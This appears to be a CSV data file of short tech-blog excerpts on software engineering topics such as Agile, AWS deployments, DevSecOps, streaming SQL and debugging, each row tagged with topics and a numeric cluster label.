3360,"This is how a bomb looks like from the inside: I wish typescript had an override reserved word and also would be very nice if lambda properties could be overwritten. There is a lot of lambda properties all over the code, and that is to protect scope. By scope, I mean the reserved word this that is very confusing and messy in Java Script. A way of getting around it is to have a public method as lambda and having that method to call a different one that is normal and can be overwritten. Like this: So far every future-proof feature has been a great deal. So where does over-engineering comes in? Well, over-engineering in software means something unnecessary, a written code that could be less complex. Over-engineering can even lead to a massive and slow end product. Sometimes people will take a hard path to a solution for no good reason. Maybe there was some feature in the language or framework that would allow the problem to be solved in an easy way but they just didnt know it.","['JavaScript', 'Typescript', 'Phaserjs', 'Future Proofing', 'Overengineering']",9
3361,"But time is also a great reason to deem things as over-engineering. Lets say we alter the Grid class so it can support irregular column sizes, so some of then can have 5 rows and other 6 because maybe someday it would be useful. That is a bet Im not willing to make. Even things like the game over check could be better for sure, but is it really getting in the way of something? The time I spent on this project was about four days total, and the initial plan was three days. There is always room for improvements of course, but I think it is a good project given the scope and time span.","['JavaScript', 'Typescript', 'Phaserjs', 'Future Proofing', 'Overengineering']",1
3362,"Why do you need a technical support team? As issues start coming in from your customers, you realize you need someone who can triage any technical issue, figure out the scope of the issue and any creative workaround solutions needed for the short term. As a company you want to keep all your customers happy, but with scarce engineering resources who is constantly prioritizing between new development and bug fixes, issues affecting small number of customers may live in the backlog longer. For such issues, you need a technical support engineer to not only figure that it is in fact a low priority issue but also a short term workaround solution. Not only that, instead of a reactive issue-investigation approach, a technical support team can build monitors around your critical business operations metrics like % of healthy products or % healthy orders. This ensures your business is running more reliably and that you are fixing issues even before they start to become visible. So this team is essentially plugging holes in a leaky bucket of customers and retaining the customers trust before it hits the breaking point, thereby having an overall impact on the customer retention rate.","['Startup', 'Technical Support', 'Support', 'Jira', 'Asana']",0
3363,"What is my technical support team doing? First of all, I want to confirm if in fact, the rate of incoming tasks is growing with the number of customers. Second, I want a list of problem areas exposed by the support tasks in order of monthly frequency to understand the major types of issues that are coming in. Third, which types of tasks are taking the longest. Only then, I can formulate a plan to address the problem areas. There can be multiple recourses depending on the type of issue:1] Filing bug reports2] Feature requests3] Educating business/customer service teams on use of internal tools4] Changing best practices5] Creating tools for support team to run a script on a schedule6] Automate a set of manual steps by building a script When I joined Spring 3 years ago as the first technical support engineer, the client support and customer service teams were sending issues and requests to an email group where I was replying with status updates and resolution notes. As the support queue grew, I was struggling with how to prioritize tasks and which ones needed a followup. Not only that, but it was also cumbersome to measure the workload as it meant going through past emails, manually categorizing issue types, aggregating them month by month and preparing an excel report. We needed to move the support process out of emails and into a task based system.","['Startup', 'Technical Support', 'Support', 'Jira', 'Asana']",0
3364,"Nobody (hopefully) is going to be creating a Zombie Apocalypse service on NGS. But, what if your company has built up a ton of infrastructure around supporting a paid service with access to a stream of data? Companies like Reuters charge ridiculous piles of money for proprietary and difficult-to-consume feeds. With private exports, importers need an authorization token to import. This authorization token comes from the exporter, and can require payment or a subscription that doesnt ever go through NGS. Since that transaction is out of band, you dont have to worry about NGS trying to take a percentage of it.","['API', 'Message Broker', 'Synadia', 'Ngs', 'Services']",11
3365,"But what if NGS goes down? Well, what if AWS or Azure or Google go down? NGS is a service, and it needs to be available, fast, and reliable. Relying on NGS doesnt make you any more vulnerable than relying on Amazon or Google or Microsofts clouds. Virtual machines, containers, clusters, and services like NGS are all the new electricity.","['API', 'Message Broker', 'Synadia', 'Ngs', 'Services']",11
3366,Wasnt this supposed to be easy? You paid a glamorous agency to design your new website. You spent thousands of hours and a gazillion dollars laboring over every aspect of the design to get it just right. After rounds and rounds of meetings and reviews and arguments and sweat and tweaks and nudges finally you have a design you are happy with. Even the board is happy with it.,"['Web Development', 'Development', 'CMS']",2
3367,"Yes, you can still pay a lot of money for a CMS, and the challenges in using them effectively are well documented. But over the years more people put their weight behind trying to solve this problem. New players have entered the market making the cost and the scarcity of the skills come down. The days of giant CMS vendors dominating the entire market may be numbered. And now we seem to be on the verge of something of a revolution. A CMS is now attainable on any size of budget and without a team of specialized consultants to roll it out.","['Web Development', 'Development', 'CMS']",12
3368,This generated code was devised long before your site was ever being discussed. It was not made for you. It was made to serve a generic purpose. It has been designed to be massively flexible so that it can be used time and time again. Thats hard to do and so we often pay a penalty for it as it introduces a variety of code smells into our sites. You never want visitors to your site to be able to smell your CMS.,"['Web Development', 'Development', 'CMS']",19
3369,"Are you on a PC or a Mac? What browser plugins do you have installed? What crazy software are you running in the background? A bug should always be written in a clear, concise and precise manner so that it gives an exact location of the bug in the extensive/exhaustive software map. I reiterate that this not only improves the quality of software but also reduces the cost of testing and developing the software to a great extent.","['Software Development', 'Programming', 'Bugs', 'Development', 'Software Testing']",13
3370,,"['Odroid', 'Hardware', 'Firmware', 'Upgrade', 'Videogames']",16
3371,"I consider myself somewhat qualified to provide this insight. I am an agile practitioner from the days where Agile development involved using a screwdriverto dismantle your own cubicles and create an open seating plan! Early in my career I worked with a medical software company. We built desktop software for image review that was installed on Doctors desktop in hospitals. Deployment process involved traveling with CDs to another city and installing the desktops, and the image servers. We were subject to FDA approval, so we had to build to specs that had been through FDA-approval. This created an ideal environment for top-down, waterfall methodology. All specs were written down, approved, signed-off and we built to those specs & those specs only. It wasnt until the dev team started traveling with the installation team, and watching doctors use our software, that we realized that we could do so much better only if we could talk to the customer earlier in the cycle. We coded to exact specs, and yet delivered something that was not as useful as it could have been. This graphic shows some of my experience.","['Agile', 'Scrum', 'Scrum Agile']",12
3372,"Around this time my team heard of something called the Agile Manifesto and a practice called Extreme Programming. Given that it was signed by industry veterans whose books we were actively reading, people such as Martin Fowler and Kent Beck, lent the practice a lot of legitimacy. My team of five dismantled our cubicles, pulled in our PM (proxy for our customer) to come sit next to us, set up a board with index cards and went to work, making up XP as we went along. We had a weekly cycle of planning and demos, lots of pairing and discussion. I worked in various iterations and variations of this, in different companies for about 15 years. One team seemed to follow no methodology at all, but it was because all team members were from deep agile background, iteration and collaboration was their default state of operation and they did not need an imposed process.","['Agile', 'Scrum', 'Scrum Agile']",0
3373,"So is Agile about open floor plans or talking a lot? If you have stand-ups and retros can you be claim to be Agile? Where does Scrum or TDD fit in? Often people get too caught up in specifics of the process Scrum or Kanban? Two weeks or one week sprint? If you dont have backlog grooming, are you really being Agile? Having grown up doing active development using Agile methods, with other developers equally engaged, developing and adapting practices, has given me a good insight and this post is to identify the basic principles.","['Agile', 'Scrum', 'Scrum Agile']",1
3374,"Getting something visible, even if it is a small subset of the functionality, in front of the customer as soon as possible allows us to get feedback faster. This is why I always advocate focusing on building a small slice of the feature, end-to-end, and getting that all the way to production. Say, you are building a page for your support agents to see all the data about a customer. Instead of spending a lot of time researching the data sources for the entire page and writing all the APIs first, try to get a subset of data on the page all the way to production. You will be able to exercise your integration and deployment mechanisms, you can start getting feedback on the UI framework, how this page fits with rest of your application etc. These things are easier to adjust when you have a small amount of code, as opposed to when you have built an entire API framework.","['Agile', 'Scrum', 'Scrum Agile']",0
3375,"Given that we are planning to constantly evaluate and change, our software should be easy to change. What if, after a customer start using the application they wanted some data to show up differently than originally designed? Could we do that without touching everything else on the page? Or we need to call a different API to get datacould we make that change safely? This is where good development practices and mechanisms come in Unit Testing: We have automated testing at various levels so there is a safety net for changes. It is also critical to be mindful about what the unit tests actually test. If you take the above example, using a different API to get data, ideally, should require no change to the units tests for our API that serves data to the UI. Unit tests exist to give you the confidence to refactor the code, which in turn gives you the freedom of writing only what you need now, and rest later, not to produce some 100% coverage metric anyway you can.","['Agile', 'Scrum', 'Scrum Agile']",13
3376,"CI/CD: This enables us to shorten the distance between commit and delivery. When barriers to deployment are removed, and we can push small changes to production, risk from change is greatly lowered. If deployments are tedious, they are less frequent. Less frequent deployments push a ton of change out, touching a large surface area, and hence are riskier. If you learn more about why software delivery performance matters, and what metric to use to optimize it, I highly recommend this book by Nicole Forsgren.","['Agile', 'Scrum', 'Scrum Agile']",10
3377,"Since all of these approaches seem too cumbersome for this investigation, I decided to take an alternative approach. My idea was to debug H2Os code to find the moment when the scoring function picks the score from the wrong instance. Since this behaviour has a low probability of failing(only fails once in ~200 of runs), it would be absurd to debug each run waiting for the one where the concurrency issue would manifest itself. Instead, I resorted to conditional breakpoints so that the JVM would only suspend upon an inconsistent state. Conditional breakpoints extend the power of a normal debug breakpoint, such that the JVM is only suspended if a given condition is met. This is a very useful feature to explore non-deterministic behaviour, since instead of suspending the JVM on every iteration, we can suspend it only when the state becomes inconsistent.","['Debugging', 'Software Development', 'Software Engineering', 'Test Automation']",3
3378,"Todays customers have high expectations from online sites and web apps. They expect sites and apps to always be available and it becomes big news when they are not. Imagine a social media app is down for an hour or so. Companies will put their best people on fixing the issue as soon as possible. They will also send communications to users explaining what happened and how they are going to avoid that in the future. Internally, they will go through a lot of retrospects and post mortems to strengthen their systems and infrastructure and follow through on their promises to their users.","['AWS', 'Cloud Computing', 'Cloud Strategy', 'Canary Deployment', 'Blue Green Deployment']",17
3379,"Blue-Green Deployment is a popular technique to deploy a new version of the software without impacting current live traffic. In this approach, two infrastructure stacks are created; one is called Blue and the other one is called Green. At any given time, one of the stacks is serving live traffic while the other one is idle. The idle stack infrastructure could be turned off while not in use for deployment to avoid resource waste. During updates, the new version is deployed on the idle stack. Once all validations are complete, traffic is opened to the idle stack, the idle stack becomes active, and the active stack becomes idle.","['AWS', 'Cloud Computing', 'Cloud Strategy', 'Canary Deployment', 'Blue Green Deployment']",10
3380,"The rollback is easier while both ASGs are serving traffic rather than after shrinking the older version. Just shrink the ASG which has V2 to 0. This will terminate all the instances which have V2. However, after full release, rollback will take longer. To rollback, repeat the above process for the previous version of software. The time it takes to rollback depends on number of instances and boot up time for each.","['AWS', 'Cloud Computing', 'Cloud Strategy', 'Canary Deployment', 'Blue Green Deployment']",18
3381,"In this approach stand up two parallel stacks of ALB/ECS. Use Route53 weighted policy to send traffic to either or both stacks. By default, 100% traffic is being served by one stack (Say, Blue). The new version is deployed on the inactive stack (In this case, Green). All the validations and health checks are run on the Green stack prior to routing any traffic. Once everything is good, a small percentage of traffic (say 10%) is opened to the Green stack by changing the weight of the Route53 record.","['AWS', 'Cloud Computing', 'Cloud Strategy', 'Canary Deployment', 'Blue Green Deployment']",11
3382,"When I first started out developing enterprise applications nearly 25 years ago, UI, for the most part, was just a simple way of getting the data into a system of record. If you were writing a desktop application, you would use your choice of language (such as Java, C++, COBOL) and use its UI code to make your application. For mainframes and enterprise applications you would have an even smaller list of choices. We did not have titles or the need to define a front-end developer vs. a full-stack developer.","['Web Development', 'Full Stack Developer', 'Front End Developer', 'Job Titles']",12
3383,"Nano-services yield a great experience in serverless computing Serverless design provides you the opportunity to toil with numerous styles together with nano-services. Its these designs which aids in the configuration of your serverless computing use. Nano-services can be said as the leading architectural outline since every single operation originates with its individual API end-point plus its individual isolated task folder. Every single API end-points depend on a single task folder, which equips a single CRUD (Create, Retrieve, Update, Delete) performance. It operates in an impeccable link through micro-services, a design of serverless computing and also supports auto-scaling as well as weight harmonizing. You dont need to physically design clusters and weight balancers.","['Serverless', 'AWS', 'AWS Lambda', 'Cloud Computing']",10
3384,"The uncomplicatedness and cost-effective characters of serverless computing make it click amongst developers. Developers all over are interested in serverless computing since it is a great bound of confidence to them. There is no need to compose the codes from scratches anymore. In the near future, you can anticipate this development to be the front position of the cloud network. At this point, there is definitely prerequisite for serverless cloud computing. Actually, I am shocked that it incurred a longer for cloud suppliers to fix this out. Nonetheless, its worthy they did it.","['Serverless', 'AWS', 'AWS Lambda', 'Cloud Computing']",16
3385,"Using the indexer of a string to get an individual char is an O(1) operation. As a string is really just a fancy array of chars, you only need some bound checking before fetching the value. Intuitively, one would expect a similar behavior from a String Builder. However, the benchmarks tell a whole different story: This benchmark measures the time needed to access the first character of String Builder instances of different sizes. At a glance, its pretty obvious that the access time degrades non-linearly with the number of characters. So whats going on under the hood? For reference, here is the same benchmark using a String indexer instead: String Builder is a class that pre-allocates an array of that you can use to concatenate a variable number of strings while limiting the number of allocations. In that sense, it works a lot like List<char>.","['Programming', 'Csharp', 'Windbg', 'Dotnet', 'Software Development']",3
3386,"It also comes with some drawbacks, as the benchmark puts in evidence. To retrieve a specific character, you need to browse the chain of String Builder instances until finding the one containing the character at the right index. It means that getting a character at a given index is actually an O(n) operation, where n is the number of chained instances. And it gets worse: the most commonly used operation with a String Builder is Append, which appends a string to the end of the buffer. Keeping that in mind, the String Builders are chained from the end: your String Builder reference points to the last of the chain, and each of them holds a reference to the previous one. This makes Append operations faster, since you dont have to browse the whole chain to append your characters. But on the other hand, it makes accessing the beginning of the string much more expensive, since the whole chain has to be browsed. See in this benchmark how much it costs to access the first character versus accessing the last, with a String Builder of 10 million characters: Now that we know how String Builder works, we understand whats happening in Win Dbg. On one side, a command is executed and the output is pushed to a String Builder. On the other side, the contents of the String Builder is parsed and the result is displayed on the screen. If at some point new content is added faster than it is parsed, we enter a vicious cycle: because the current index is getting farther away from the end of the String Builder, accessing individual characters takes more and more time and slows down the parsing. Because the parsing is slowed down, the current index is getting father away from the end of the String Builder as new content is pushed to it. At some point, it becomes so expensive that almost no parsing is done, and the application freezes.","['Programming', 'Csharp', 'Windbg', 'Dotnet', 'Software Development']",3
3387,"The String Builder was a poor choice for this usage. Every time content is appended to the buffer, we make a copy of the string for no reason, and weve seen that the performance profile to access individual characters is not adapted for the task. Instead, the DML parser could use a simple queue of strings. It would also need a trim function to remove the strings from the queue as they are processed. I ended up submitting the following implementation: As much as possible, it sticks to the String Builder API to avoid having to modify the parsing code. The Trim method is called whenever the parser has finished reading a node, with the index of the last character processed. With that solution, we avoid the string copy to the String Builder, and accessing individual characters stays an O(1) operation most of the time.","['Programming', 'Csharp', 'Windbg', 'Dotnet', 'Software Development']",3
3388,"ARNs typically have a format as follows Since we now have the VPC id of the accepter VPC, we can use its ARN to extract the account-id. The code below does exactly that. I am using the aws_vpc data source, and using the arn to extract the account-id. I have defined the accepter_account_id as a local value Now that I have the information needed to raise a VPC peering request, I am completing the peering request initiation and acceptance as below. If you notice, I am using the profile variables to tag the peering connections as well. Tagging is a good practice, especially if you have multiple peering connections and itll help during any maintenance or network troubleshooting. We have a complete blogpost dedicated to tagging practices, and I highly recommend you check it out.","['AWS', 'Networking', 'Terraform', 'Automation', 'DevOps']",11
3389,"Now that the peering connection is created, we have to update the route table entries on both sides to send traffic via the peering connection. Given that a single VPC can have multiple route tables, and I wanted to code to work irrespective of the number of route tables each VPC has. I have created a loop using count to cycle through all the route tables and create the route entry to the other VPC via the peering connection ID. Note that the route tables are being updated with the peered VPC CIDR block. It is also possible to route specific subnets via the peering connection, but I have not done that here. This may be relevant in cases where you need to access some central servers such as Directory Service, Anti-virus server, in a Shared Services VPC as part of a landing zone. Some organisations may also host other servers in the Shared Services VPC which are not relevant for all the peered VPCs, and want to restrict access to specific subnets only.","['AWS', 'Networking', 'Terraform', 'Automation', 'DevOps']",11
3390,"Dev Sec Ops is about introducing security earlier in the software development life cycle (SDLC). The goal is to develop more secure applications by making everyone involved in the SDLC responsible for security. Having business, tech and security work together to produce secure products seems like a dream come true. Maybe too good to be true? Lets investigate more and see if Dev Sec Ops can be the silver bullet we all need in building secure products.","['DevOps', 'Devsecops', 'Technology']",10
3391,"With the shift to cloud computing and dynamic provisioning of resources, developers have gained numerous benefits around speed, scale and cost of application development. These benefits lend themselves so nicely to the adoption of the Dev Ops movement. Dev Ops strongly advocates for automation and monitoring at all steps of the SDLC. The goal is for shorter development cycles, increased deployment frequency and more dependable releases, all aligned with business objectives. Like I said before, as a developer, I love this. But stable infrastructure and applications does not equal secure infrastructure and applications. In the waterfall lifecycle, security checks were put at the end before the product was released. Security was seen as a roadblock, the last gate-check, on the way to a production release. Many things have changed in regards to how applications are developed, but not how security is viewed.","['DevOps', 'Devsecops', 'Technology']",10
3392,"These days, most teams use the agile methodology for software development. In an agile environment, the focus is on rapid delivery. By using iterative planning and feedback results, teams can continuously align product deliverables to business needs. The adaptability to changing requirements is great for delivering a meaningful product, but if youre releasing a new version of your product every week, when do you test for security vulnerabilities? Unfortunately, traditional security processes have not kept pace in agile/Dev Ops environments rendering security to become a major roadblock in software development where it is usually bypassed. If its not bypassed, the development team rarely has enough time to address all the issues before the product goes live which means that an insecure application lives somewhere on the internet. The ironic part is that ignoring security to avoid the risk of missing a deadline actually puts more risk into the application. Security defects in the SDLC can lead to serious vulnerabilities like a breach caused by bad code. This is why we need Dev Sec Ops.","['DevOps', 'Devsecops', 'Technology']",1
3393,"Dev Sec Ops allows developers to focus on writing high quality and secure code, enabling teams to release titanium applications. The benefits are simple:security from the start minimizes the chance of vulnerabilitieshaving automated security tools running in pipelines is that it lets security team members focus on the high-hanging fruitbetter collaboration and communication between dev and security teamsimproved operational efficiencies across security and the enterprise However, there are challenges associated with Dev Sec Ops. Even with security baked into a pipeline, there are still ways to circumvent security checkpoints. Lets take an example where a vulnerability scanner is being used to block a build/deployment if a certain vulnerability is found. As a developer, you know what that vulnerability is and you know your code has it, but you really need to do this release. So you find a way to hide pieces of the code that you know will fail a security scan, resulting in a successful build. Another common situation is when teams decide to break their build if theres a presence of one or more findings of a certain severity. For example, a team may say that they do not want to break their build unless the finding is high or critical. While this certainly helps identify and address high priority issues immediately, the consequence is that medium and low findings make it to production builds.","['DevOps', 'Devsecops', 'Technology']",10
3394,"Lets understand how SQL is mapped to streams. A stream is a table data in the move. Think of a never-ending table where new data appears as the time goes. A stream is such a table. One record or a row in a stream is called an event. But, it has a schema, and behave just like a database row. To understand these ideas, Tyler Akidaus talk at Strata is a great resource.","['Big Data', 'Stream Processing', 'Programming', 'Software Development', 'Software Engineering']",8
3395,"When you write SQL queries, you query data stored in a database. Yet, when you write a Streaming SQL query, you write them on data that is now as well as the data that will come in the future. Hence, streaming SQL queries never ends. No, it works because the output of those queries are streams. The event will be placed in output streams once the event matched and output events are available right away.","['Big Data', 'Stream Processing', 'Programming', 'Software Development', 'Software Engineering']",8
3396,"A stream represents all events that can come through a logical channel and it never ends. For example, if we have a temperature sensor in boiler we can represent the output from the sensors as a stream. However, classical SQL ingest data stored in a database table, processes them, and writes them to a database table. Instead, Above query will ingest a stream of data as they come in and produce a stream of data as output. For example, lets assume there are events in the boiler stream once every 10 minutes. The filter query will produce an event in the result stream immediately when an event matches the filter.","['Big Data', 'Stream Processing', 'Programming', 'Software Development', 'Software Engineering']",8
3397,"load prediction and outlier plug detection see Smart grids, 4 Billion events, throughout in range of 100Ks)Traffic Monitoring, Geofencing, Vehicle, and Wildlife trackinge.g. TFL London Transport Management System Sports analytics Augment Sports with real-time analytics (e.g. this is a work we did with a real football game (e.g. Overlaying realtime analytics on Football Broadcasts)Context-aware promotions and advertising Computer system and network monitoring Predictive Maintenance, (e.g. Machine Learning Techniques for Predictive Maintenance)Geospatial data processing For more discussions about how to use Stream Processing, please refer to 13 Stream Processing Patterns for building Streaming and Realtime Applications.","['Big Data', 'Stream Processing', 'Programming', 'Software Development', 'Software Engineering']",6
3398,"Now, that doesnt just mean computer systems, as in the context of system administrator,"" but systems as a whole. The way things move, the objectives that guide them, the constraints placed upon them, the whole show. My intense attachment to that which my friends and coworkers usually regard with a dull acceptance often leads to confusion when I try to explain what I mean when I say, in all honesty, I love systems. As I talked about the things I was interested in doing, my team associated systems and work processes with overbearing amounts of busywork, demands from higher-ups, and other responsibilities that they tended to complete begrudgingly. For them, my excitement was totally out of place. And who was I, the newest one there, to tell them I knew better? The difference I saw was that these systems were often imposed by someone with the intent of seeing the results they wanted or getting a set of numbers for a boardroom on some higher floor. For me, systems meant a way of freeing time rather than consuming it, and a way to ensure that the work being prioritized is the work truly moving us towards our overarching goals. These sorts of systems need input from those they affect, and at their best, theyre designed from the affected groups upward. It wasnt that we didnt have systems for our processes, its that the systems we had werent good enough yet, and we had a long way to go before theyd be where we needed them.",['DevOps'],0
3399,"With the improvement of our pipeline, build load decreased. Less time was spent waiting around for compilation, testing, and integration. I rallied some teammates and worked on improving our documentation with a new developer wiki and IDE tools to handle the bulk of our documentation without putting too much extra strain on our team. The usual gripes about documenting our work started to quiet down. We developed a system to run and track emergency corrections in the production environment and our database administrator could stop cleaning up after drift. We improved our intake system for work requests, as well as our tracking of people involved and their responsibilities to the work being done, and our developers stopped needing to chase people down to get answers or clarifications. As we started to pull away from unguided work placed on the individual, we saw the quality of work in our team and those adjacent continue to improve, along with morale. Of course, continuing to improve and maintain these systems is an ongoing effort, but now with a team that understands their benefits, were well on our way.",['DevOps'],10
3400,"Click on the Data Model file we just created, Xcode will open Data Model Editor where we can add Entity to the Managed Object Model Schema. Click Add Entity and Set the name of the new Entity as Film. Make sure to set the codegen is set to Manual/None so Xcode does not automatically generate the Model class. Then add all the attributes with the type like the image below: After we have created the schema with Film Entity, we need to create new file for Film class with NSManaged Object as the superclass. This class will be used when we insert Film Entity into NSManaged Object Context. Inside we declare all the properties related to the entity with associated type, the property also need to be declared with @NSManaged keyword for the compiler to understand that this property will use Core Data at its backing store. We need to use NSNumber for primitive type like Int, Double, or Float to store the value in a Managed Object. We also create a simple function that maps a JSON Dictionary property and assign it to the properties of Film Managed Object.","['iOS', 'Core Data', 'Synchronization', 'iOS App Development', 'Swift']",15
3401,"We all know examples of everyday annoyances, awkward self-service systems and websites that just dont seem right. Weve all browsed retail, travel, banking websites and apps for ages just to figure out we couldnt buy the desired product or services the way wed expect. At the beginning of the 21st century it was accepted that some technology was just not mature enough to be used in our everyday lifes. Why do so many digital initiatives and systems by so many organisations just dont succeed, dont work the way wed expect or become some sort of awkward beast? It is more than a decade ago that I was involved in a discussion around artifical intelligence and machine learning where someone refused to accept that the computer would make business decisions itself without a human being able to understand each decision. Hence, the system was downgraded to be a mere set of easily understandable and traceable rules than an autonomous automated machine learning system. People were reluctant to hand the decision-making process over to the machine. It was about that time when I became curious why organisations of all types seem to struggle with technology.","['Innovation Lab', 'Software Development', 'Systems Engineering', 'Project Management', 'User Experience']",17
3402,"How about an app were you can easily send messages to all of your friends and family. Yes it does and it is called Facebook, Whats App, Hangout, Telegram or Signal. And how about a service with only a text-field and a button that easily allows you to find websites and information on the Internet?","['Innovation Lab', 'Software Development', 'Systems Engineering', 'Project Management', 'User Experience']",17
3403,"It is not uncommon to hear things like: If we migrate to super cloud, then super cloud controls us, can steal our business. We become hostages of super cloud. Not all people in technology are the same. Some prefer Linux, others Windows and many others Mac OSX. Some program in Visual Studio Code, others use Sublime Text, some prefer plain text editors. Some people love to use AWS Cloud, others prefer to use Google Cloud and some think that there is no cloud, just other peoples computers and deem cloud computing and cloud services evil.","['Innovation Lab', 'Software Development', 'Systems Engineering', 'Project Management', 'User Experience']",16
3404,"The meeting ended with a We should carefully review and evaluate the decision before starting the project and there goes execution down the dish washer. A good plan is always there to be changed. In fact looking at methods like the Unified Software Development Process or the Scaled Agile Framework, you will notice that execution is key. In the digital era, absolutely nothing is set in stone. Software can be updated almost instantaneously. A bugfix for a website can be deployed in seconds, a mobile App updated in minutes. With state-of-the-art Dev Ops processes including continuous delivery, patching software has become a process end-users dont even notice anymore.","['Innovation Lab', 'Software Development', 'Systems Engineering', 'Project Management', 'User Experience']",1
3405,"Making stake-holders transparently aware of the project management method, the software development model and their foundations is key to avoid frustrations with digital projects. There is flexibility in many agile frameworks and software development methods or models. Yet, their flexibility has limits and breaking base rules of these methods will not just lead you to a Frankenstein model, but ultimately bring any project into trouble. Learn the method you intent to apply, understand it and apply it properly. Make sure stakeholders understand the way your project is organised and make them accept it. With all its advantages and more importantly its disadvantages.","['Innovation Lab', 'Software Development', 'Systems Engineering', 'Project Management', 'User Experience']",12
3406,"At a high-level, Spinal Tap was designed to be a general purpose solution that abstracts the change capture workflow, enough to be easily adaptable with different infrastructure dependencies (data stores, event bus, consumer services). The architecture is comprised of 3 main components that aid in providing sufficient abstraction to achieve these qualities: The source represents the origin of the change event stream from a specific data store. The source abstraction can be easily extended with different data source types, as long as there is an accessible changelog to stream events from. Events parsed from the changelog are filtered, processed, and transformed to corresponding mutations. A mutation is an application layer construct that represents a single change (insert, update, or delete) to a data entity. It includes the entity values before & after the change, a globally unique identifier, transaction information, and metadata derived from the originating source event. The source is also responsible for detecting data schema evolution, and propagating the schema information accordingly with the corresponding mutations. This is important to ensure consistency when deserializing the entity values on the client side or replaying events from an earlier state.","['Soa', 'Cdc', 'Microservices', 'Data Streaming', 'Pub Sub']",8
3407,"The pipe coordinates the workflow between a given source and destination. It represents the basic unit of parallelism. Its also responsible for periodically checkpointing source state, and managing the lifecycle of event streaming. In case of erroneous behavior, the pipe performs graceful shutdown and initiates the failure recovery process. A keep-alive mechanism is employed to ensure source streaming is restarted in event of failure, according to last state checkpoint. This allows to auto-remediate from intermittent failures while maintaining data integrity. The pipe manager is responsible for creating, updating, and removing pipes, as well as the pipe lifecycle (start/stop), on a given cluster node. It also ensures any changes to pipe configuration are propagated accordingly in run-time.","['Soa', 'Cdc', 'Microservices', 'Data Streaming', 'Pub Sub']",3
3408,"A final set of requirements, locked down, and then getting heads down delivering exactly that was what we needed. Being wrong we could fix later. The only back-and-forth we kept was as we discovered technical blockers, trying to find the quickest way around. As much as possible, we did not want to squiggle! Im grateful that Kara Mc Nair, the EM who lead this team, knew through more than a decade of experience that what we needed now was a straight line, waterfall-ey method from our problem to any viable solutionand how to make that happen in an agile oriented team. Any solution that got rid of the offending retweets by the 23rd was better than an ideal solution on the 24th.","['Agile', 'Waterfall', 'Product Management', 'Engineering']",1
3409,"The team delivered a solid release on time, and without compromising work hours. That was some great engineering management to see in action, and Kara having lead waterfall-style development teams in the past was key to our success that day. The upfront planning and early design changes saved the day here. If you dont really know how to waterfall, start here! Being late is usually not devastating, and its so, so expensive to be completely wrong. The risks with agile are lower, so its often the objectively better process. However, waterfall methods might be what your next project needs if the following are true: The wrong solution on time is definitely and substantially better than an ideal solution just one day after the deadline. In our case, there was a limit to how wrong we could be. The problem statement was extremely clear and we knew our solution would roughly solve that problemit just might not be ideal.","['Agile', 'Waterfall', 'Product Management', 'Engineering']",1
3410,"Connection strings: probably change per environment and should be secured, so should not be compiled into the code API keys and base URLs for integrated services: also probably change per environment and should be secured Feature toggles: while this is reasonable, Id argue its best to use a specific library or service for this like Launch Darkly. But well give it a begrudging Application-specific data: youll see that the application name is here. Its really useful to have that for logging/monitoring. Perhaps even some framework-level code expects that setting. But this should be hard-coded 10 out of 10 times Settings for how the object runs: sometimes you want to choose a different algorithm for a key business process, or something similar. How often are you really updating this at run-time? There are two issues at play here. Not only should changing and re-deploying the code be just as easy as pushing a commit, but if your app is deployed across multiple servers or in some serverless Paa S, its actually harder to update the config file than it is to push new code.","['DevOps', 'Continuous Delivery', 'Config', 'Configuration', 'Web Development']",11
3411,"In my experience the stateful aspect of applications is the hardest thing about running them in multiple environments. Your code is in one state, your config files are in another, and your database schema is in another. Applications dont like not being able to find their config values, or running against a DB schema theyre not expecting. This means that your code is tightly coupled with your config/schema, and you need to make sure they are updated in lockstep. This means more sophisticated patterns (blue/green deployments, backward-compatible code) are required.","['DevOps', 'Continuous Delivery', 'Config', 'Configuration', 'Web Development']",8
3412,"What triggers the debugging process is unwanted behavior. We notice these all around and within us. Sometimes we have systems in place that tell us that an unwanted behavior has occurred. This was the case with one of our websites at some point. It was both programatically tested and observed through personal experiences that the performance of the website was really poor sometimes. After struggling to figure it out for a few months, my team called upon me to assist. Although there are quite a few years since Im not coding anymore, the universal principles and methods of debugging that Ive been using are still valid. I will come back to this example as I explain various principles and methods I use.","['Debugging', 'Philosophy', 'Self Improvement', 'Understanding', 'Life Lessons']",13
3413,"Before going any further, lets talk about motivation. Debugging is about finding the truth. Ive seen programmers randomly applying fixes until the behavior was corrected and stopping there. They failed to find the truth. There is a byproduct of the debugging process that just as important as identifying and describing the root cause. That is the process of constantly improving ourselves. If we dont understand what the problem was and why our change fixed it, we havent learnt anything. We are likely to produce the same wrong behavior over and over again and fix it every time. Thats one way to keep ourselves busy.","['Debugging', 'Philosophy', 'Self Improvement', 'Understanding', 'Life Lessons']",4
3414,"Luckily, theres a multitude of tools that we can use to make the observation process much faster and precise. When I started public speaking, I used to records videos of myself and then identify areas I could act on to improve. In real life, its a bit more difficult to put tools in place to observe our personal behavior. There are various gadgets that help to some extent. And theres always a generic tool we can use, which is being conscious of ones self. This is a skill that can be practiced through meditation and other techniques.","['Debugging', 'Philosophy', 'Self Improvement', 'Understanding', 'Life Lessons']",4
3415,"However, data itself is useless without understanding it. Another great principle thats universally available is to question the data. There is a very popular framework called the 5 Whys. I find this works, but its not as easy as it sounds. Why were there 3 million database queries per day? Before we can answer this question we have to answer a lot more like what are those queries and how do we measure them? On our slow website, looking at 3 million queries was not feasible. So we went in and deployed additional tools that counted how many times different queries have ran. We found that most of them were supposed to be cached in memory. Only now can we get to next why. So, why is the cache not working sometimes? But, just to point out, this last question is based on the assumption that cache was the issue. This assumption is not validated yet. So, on the 5 Whys framework, sometimes one might work down a branch of Whys that are based on assumptions. If at some point, an assumption is invalidated, one has to go back one or more levels to previous Whys and find different assumptions.","['Debugging', 'Philosophy', 'Self Improvement', 'Understanding', 'Life Lessons']",8
3416,"In computer programming, the last steps are called Stack Trace. So weve built ourselves another little tool that would monitor the cache and collect the stack trace the exact moment it happen. Going back through the steps, we finally have found the root cause. That website actually hosted 3 websites. The other two were internal to us. Only when someone accessed the internal websites, the URL rewriter would wrongly look at the cache of the main website. Because it didnt match what was expected, the URL rewriter would clear the cache for all 3 websites. This fully explained the randomness of the behavior, as the internal websites were used a few times a day.","['Debugging', 'Philosophy', 'Self Improvement', 'Understanding', 'Life Lessons']",3
